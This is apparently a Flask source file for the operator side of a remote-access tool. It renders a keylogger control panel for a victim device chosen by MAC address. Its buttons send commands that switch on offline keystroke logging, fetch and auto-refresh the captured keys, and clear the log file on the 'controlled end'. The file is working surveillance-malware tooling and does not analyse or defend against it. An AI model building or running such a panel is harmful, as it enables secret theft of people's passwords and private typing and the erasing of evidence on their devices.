from flask import Blueprint, request, render_template_string, session, redirect, url_for, jsonify
import os
from core import clients_db, save_db, is_online
try:
    from ui import ADMIN_CSS
except Exception:
    ADMIN_CSS = ""

bp = Blueprint('keylog', __name__)

@bp.route('/keylog/<mac>')
def view_keylog(mac):
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    if mac not in clients_db:
        return "设备不存在"

    info = clients_db[mac]
    html = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>键盘记录 - {{ info.name }}</title>
        <style>
            {{ admin_css|safe }}
            body { font-family: 'Segoe UI', Tahoma, Verdana, sans-serif; background: #1e1e2d; color: #dcdcdc; padding: 20px; }
            .container { max-width: 900px; margin: 0 auto; background: #2b2b3c; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
            h2 { border-bottom: 1px solid #444; padding-bottom: 10px; margin-top: 0; display:flex; justify-content: space-between;}
            .controls { margin-bottom: 20px; display:flex; gap:10px; flex-wrap:wrap; }
            button { padding: 10px 15px; font-weight: bold; border: none; border-radius: 4px; cursor: pointer; color: white; }
            .btn-fetch { background: #007bff; }
            .btn-del { background: #dc3545; }
            .btn-on { background: #28a745; }
            .btn-off { background: #ffc107; color: black; }
            .log-box { width: 100%; height: 500px; background: #111; color: #00ff00; font-family: Consolas, monospace; padding: 15px; border: 1px solid #555; border-radius: 4px; box-sizing: border-box; overflow-y: auto; white-space: pre-wrap; word-wrap: break-word;}
        </style>
    </head>
    <body>
        <div class="container">
            <h2>
                <span>Key Log [{{ info.name }}]</span>
                <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
                    {% set ini_st = "#dc3545" if info.get("kl", "0") != "1" else "#28a745" %}
                    {% set ini_txt = "Offline logging off" if info.get("kl", "0") != "1" else "Offline logging on" %}
                    <span id="kl-status" style="background:{{ ini_st }}; font-size:14px; padding:5px 10px; border-radius:4px; color:white;">{{ ini_txt }}</span>
                    <button onclick="window.close()" class="muted">Close</button>
                </div>
            </h2>
            <div class="controls">
                <button class="btn-on" onclick="sendCtrl('KEYENABLE:1')">Enable offline log</button>
                <button class="btn-off" onclick="sendCtrl('KEYDISABLE:1')">Disable offline log</button>
                <label class="btn" style="display:flex;align-items:center;gap:6px;"><input type="checkbox" id="auto-refresh" onchange="toggleAutoRefresh(this.checked)"> Auto refresh</label>
                <button class="btn-fetch" onclick="sendCtrl('KEYLOG_GET:1', false)">Fetch latest</button>
                <button class="btn-del" onclick="if(confirm('Clear local key log file?')) sendCtrl('KEYLOG_DEL:1', false)">Clear local file</button>
            </div>
            <div class="log-box" id="log-content">Waiting for command...</div>
        </div>

        <script>
            let pollInterval;
            let autoRefreshInterval = null;
            function sendCtrl(cmdStr, silent = false) {
                var el = document.getElementById('log-content');
                if (!silent) el.innerText = '正在下发指令: ' + cmdStr + ' ...';

                if(pollInterval) {
                    clearInterval(pollInterval);
                    pollInterval = null;
                }

                fetch('/api/file/cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: '{{ mac }}', cmd: 'F_CMD:' + cmdStr})
                }).then(() => {
                    if (!silent) el.innerText = '指令已下发，请稍等几秒钟，正在尝试从受控端回传最新的输出...';
                    pollResult(silent);
                });
            }

            function pollResult(silent) {
                var el = document.getElementById('log-content');
                let count = 0;
                pollInterval = setInterval(() => {
                    fetch('/api/file/result/{{ mac }}')
                    .then(r => r.json())
                    .then(data => {
                        if (data.status === 'ready') {
                            el.innerText = data.data;
                            el.scrollTop = el.scrollHeight;
                            clearInterval(pollInterval);
                            pollInterval = null;
                        }
                    });
                    count++;
                    if(count > 15) {
                        clearInterval(pollInterval);
                        pollInterval = null;
                        if(!silent && el.innerText.includes('正在尝试')) el.innerText += '\\n\\n等待超时，可能设备离线或网络质量较差。';
                    }
                }, 2000);
            }

            function toggleAutoRefresh(checked) {
                if(checked) {
                    if(!autoRefreshInterval) {
                        autoRefreshInterval = setInterval(() => {
                            if(!pollInterval) { // 只有上一次拉取完成才发起新的
                                sendCtrl('KEYLOG_GET:1', true);
                            }
                        }, 3000);
                        sendCtrl('KEYLOG_GET:1', true);
                    }
                } else {
                    if(autoRefreshInterval) {
                        clearInterval(autoRefreshInterval);
                        autoRefreshInterval = null;
                    }
                }
            }

            // 自动刷新左上角的离线状态监控
            setInterval(() => {
                fetch('/api/ping/{{ mac }}')
                .then(r => r.json())
                .then(data => {
                    let st = document.getElementById('kl-status');
                    if (data.status === 'online') {
                        if (data.kl === '1') {
                            st.innerText = '● 离线记录已开启';
                            st.style.background = '#28a745';
                        } else {
                            st.innerText = '○ 离线记录未开启';
                            st.style.background = '#dc3545';
                        }
                    } else {
                        st.innerText = '设备离线';
                        st.style.background = '#555';
                    }
                }).catch(e => console.error(e));
            }, 3000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html, admin_css=ADMIN_CSS, mac=mac, info=info)
